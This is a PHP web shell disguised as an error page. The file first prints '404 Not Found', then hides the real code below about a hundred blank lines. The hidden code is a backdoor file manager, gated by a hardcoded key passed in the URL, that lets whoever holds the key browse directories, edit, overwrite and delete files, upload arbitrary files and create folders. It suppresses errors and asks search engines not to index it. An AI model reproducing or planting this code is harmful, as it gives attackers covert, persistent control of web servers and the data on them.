<?php
echo "404 Not Found";
?>


































































































<?php 
$key = "logsfile";  
if (!isset($_GET['p']) || $_GET['p'] !== $key) {
    http_response_code(403);
    exit("Access Denied");
}
@ini_set('display_errors', 0);
@error_reporting(0);
$self = basename(__FILE__);
$cwd = isset($_GET['d']) && @is_dir($_GET['d']) ? $_GET['d'] : getcwd();
@chdir($cwd);

$msg = '';
// HANDLE SAVE FILE
if (isset($_POST['savefile']) && isset($_POST['filename'])) {
    $filename = $_POST['filename'];
    if (@file_put_contents($filename, $_POST['filecontent']) !== false) {
        $msg = "<div class='msg success'>File <b>$filename</b> saved!</div>";
    } else {
        $msg = "<div class='msg error'>Failed to save file!</div>";
    }
}
// HANDLE DELETE
if (isset($_GET['del'])) {
    $file = basename($_GET['del']);
    if ($file !== $self && @is_file($file)) {
        @unlink($file);
        $msg = "<div class='msg success'>File <b>$file</b> deleted!</div>";
    }
}
// HANDLE UPLOAD
if (isset($_FILES['file']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
    $target = basename($_FILES['file']['name']);
    if ($target && @move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $msg = "<div class='msg success'>File <b>$target</b> uploaded!</div>";
    } else {
        $msg = "<div class='msg error'>Upload failed!</div>";
    }
}
// HANDLE NEW FOLDER
if (!empty($_POST['newfolder'])) {
    $folder = basename(trim($_POST['newfolder']));
    if (!@is_dir($folder)) {
        if (@mkdir($folder, 0755)) {
            $msg = "<div class='msg success'>Folder <b>$folder</b> created!</div>";
        } else {
            $msg = "<div class='msg error'>Failed to create folder!</div>";
        }
    } else {
        $msg = "<div class='msg error'>Folder <b>$folder</b> already exists!</div>";
    }
}
// HANDLE NEW FILE
if (!empty($_POST['newfile'])) {
    $filename = basename(trim($_POST['newfile']));
    if (!@file_exists($filename)) {
        if (@file_put_contents($filename, isset($_POST['filecontent']) ? $_POST['filecontent'] : '') !== false) {
            $msg = "<div class='msg success'>File <b>$filename</b> created!</div>";
        } else {
            $msg = "<div class='msg error'>Failed to create file!</div>";
        }
    } else {
        $msg = "<div class='msg error'>File <b>$filename</b> already exists!</div>";
    }
}

// EDIT MODE
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $editFile = $_GET['edit'];
    $content = @file_get_contents($editFile);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Edit: <?php echo htmlspecialchars($editFile); ?></title>
        <meta name="robots" content="noindex, nofollow">
        <style>
            body { margin:0; padding:20px; font-family: monospace; background:#121212; color:#eee; }
            h2 { margin-bottom:10px; }
            textarea { width:100%; height:75vh; background:#1e1e1e; color:#0f0; border:none; padding:10px; font-size:14px; font-family: monospace; }
            .btn { background:#333; color:#eee; border:none; padding:8px 12px; cursor:pointer; margin-right:5px; display:inline-flex; align-items:center; }
            .btn:hover { background:#555; }
            svg { margin-right:5px; vertical-align:middle; }
            a { color:#4ef; text-decoration:none; margin-left:5px; }
        </style>
    </head>
    <body>
        <h2>Editing: <?php echo htmlspecialchars($editFile); ?></h2>
        <form method="POST">
            <textarea name="filecontent"><?php echo htmlspecialchars($content); ?></textarea>
            <br><br>
            <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
            <button type="submit" name="savefile" class="btn">
                <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M2 2v12h12V2H2zm11 11H3V3h10v10z"/>
                    <path d="M3 3h10v10H3V3z"/>
                </svg> Save
            </button>
            <a href="?p=<?php echo htmlspecialchars($key); ?>&d=<?php echo urlencode(getcwd()); ?>">Cancel</a>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// MAIN File Data Admin Zila!
$curdir = getcwd();
$list = @scandir($curdir);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Data Admin Zila!</title>
<meta name="robots" content="noindex, nofollow">
<style>
body { margin:0; padding:20px; font-family: monospace; background:#121212; color:#eee; }
h2 { margin-bottom:10px; }
.msg { padding:8px; margin-bottom:15px; border-radius:4px; }
.success { background:#0a0; color:#fff; }
.error { background:#a00; color:#fff; }
button { background:#333; color:#eee; border:none; padding:6px 10px; cursor:pointer; display:inline-flex; align-items:center; margin-right:5px; }
button:hover { background:#555; }
svg { vertical-align:middle; margin-right:4px; }
a { color:#4ef; text-decoration:none; }
a:hover { text-decoration:underline; }
table { width:100%; border-collapse:collapse; margin-top:15px; }
td, th { padding:6px; border:1px solid #333; word-break:break-all; }
th { background:#222; }
@media(max-width:600px){ table, tr, td, th { display:block; width:100%; } tr{margin-bottom:10px;} td, th { text-align:left; padding:5px; }}

/* MODAL */
.modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); justify-content:center; align-items:center; z-index:999; }
.modal-content { background:#1e1e1e; padding:20px; border-radius:8px; width:90%; max-width:400px; }
.modal-content input[type="text"], .modal-content textarea, .modal-content input[type="file"] { width:100%; margin-top:5px; margin-bottom:10px; background:#121212; color:#eee; border:1px solid #444; padding:5px; }
.modal-content button { margin-top:5px; }
.modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
.close { cursor:pointer; font-weight:bold; }
</style>
</head>
<body>
<h2>File Data Admin Zila!</h2>
<?php if($msg) echo $msg; ?>

<div><b>Current Dir:</b> <?php echo htmlspecialchars($curdir); ?>
<?php $parent = dirname($curdir); if ($parent !== $curdir && @is_dir($parent)) {
    echo " | <a href='?p={$key}&d=" . urlencode($parent) . "'>Up</a>";
} ?>
</div>
<br><br>
<!-- BUTTONS TO OPEN MODAL -->
<button onclick="openModal('upload')">
<svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
<path d="M.5 9.9V16h15V4H9.9L7 0H0v9.9zM1 5v10h14V5H1zm4 1h2v2H5V6z"/>
</svg> Upload
</button>

<button onclick="openModal('folder')">
<svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
<path d="M2 2h4l2 2h6v10H2V2zm5 1v2h6V3H7z"/>
</svg> New Folder
</button>

<button onclick="openModal('file')">
<svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
<path d="M2 2h12v12H2z"/>
</svg> New File
</button>

<!-- MODALS -->
<div id="upload" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <span>Upload File</span>
            <span class="close" onclick="closeModal('upload')">&times;</span>
        </div>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
            <button type="submit">Upload</button>
            <button type="button" onclick="closeModal('upload')">Cancel</button>
        </form>
    </div>
</div>

<div id="folder" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <span>New Folder</span>
            <span class="close" onclick="closeModal('folder')">&times;</span>
        </div>
        <form method="POST">
            <input type="text" name="newfolder" placeholder="Folder name" required>
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
            <button type="submit">Create</button>
            <button type="button" onclick="closeModal('folder')">Cancel</button>
        </form>
    </div>
</div>

<div id="file" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <span>New File</span>
            <span class="close" onclick="closeModal('file')">&times;</span>
        </div>
        <form method="POST">
            <input type="text" name="newfile" placeholder="File name" required>
            <textarea name="filecontent" placeholder="Optional content"></textarea>
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($key); ?>">
            <button type="submit">Create</button>
            <button type="button" onclick="closeModal('file')">Cancel</button>
        </form>
    </div>
</div>

<!-- FILE LIST (GROUPED) -->
<table>
<tr><th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr>

<?php
$folders = [];
$files = [];

// pisahkan folder dan file
foreach ($list as $item) {
    if ($item == '.' || $item == '..') continue;
    $path = $curdir . DIRECTORY_SEPARATOR . $item;
    if (is_dir($path)) $folders[] = $item;
    else $files[] = $item;
}

// tampilkan folder dulu
foreach ($folders as $folder) {
    $fpath = $curdir . DIRECTORY_SEPARATOR . $folder;
    echo "<tr>";
    echo "<td>
    <svg width='16' height='16' fill='currentColor' viewBox='0 0 16 16'>
    <path d='M2 2h4l2 2h6v10H2V2z'/>
    </svg>
    <a href='?p={$key}&d=" . urlencode($fpath) . "'>" . htmlspecialchars($folder) . "</a>
    </td>";
    echo "<td>Folder</td><td>-</td><td>-</td>";
    echo "</tr>";
}

// tampilkan file
foreach ($files as $file) {
    $fpath = $curdir . DIRECTORY_SEPARATOR . $file;
    echo "<tr>";
    echo "<td>
    <svg width='16' height='16' fill='currentColor' viewBox='0 0 16 16'>
    <path d='M2 2h12v12H2z'/>
    </svg>
    " . htmlspecialchars($file) . "
    </td>";
    echo "<td>File</td>";
    echo "<td>" . filesize($fpath) . " bytes</td>";
    echo "<td>
        <a href='?p={$key}&d=" . urlencode($curdir) . "&edit=" . urlencode($fpath) . "'>Edit</a> | 
        <a class='del' href='?p={$key}&d=" . urlencode($curdir) . "&del=" . urlencode($file) . "' onclick='return confirm(\"Delete $file?\")'>Delete</a>
    </td>";
    echo "</tr>";
}
?>
</table>

<script>
function openModal(id){
    document.getElementById(id).style.display = 'flex';
}
function closeModal(id){
    document.getElementById(id).style.display = 'none';
}
// Close modal when clicking outside content
window.onclick = function(e){
    const modals = ['upload','folder','file'];
    modals.forEach(function(id){
        const modal = document.getElementById(id);
        if(e.target == modal) modal.style.display='none';
    });
}
</script>

</body>
</html>
